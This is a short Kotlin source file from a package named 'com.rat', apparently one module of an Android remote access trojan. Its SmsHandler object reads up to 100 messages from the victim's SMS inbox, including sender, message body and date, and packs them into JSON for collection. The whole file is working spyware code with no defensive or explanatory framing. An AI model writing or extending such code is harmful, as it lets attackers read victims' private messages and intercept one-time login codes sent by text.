package com.rat

import android.content.Context
import org.json.JSONArray
import org.json.JSONObject

object SmsHandler {
    fun dump(ctx: Context): String {
        val arr = JSONArray()
        val uri = android.net.Uri.parse("content://sms/inbox")
        val cursor = ctx.contentResolver.query(
            uri, arrayOf("address", "body", "date"), null, null, "date DESC"
        )
        cursor?.use {
            val iAddr = it.getColumnIndex("address")
            val iBody = it.getColumnIndex("body")
            val iDate = it.getColumnIndex("date")
            while (it.moveToNext() && arr.length() < 100) {
                arr.put(JSONObject().apply {
                    put("from", it.getString(iAddr))
                    put("body", it.getString(iBody))
                    put("date", it.getLong(iDate))
                })
            }
        }
        return arr.toString()
    }
}
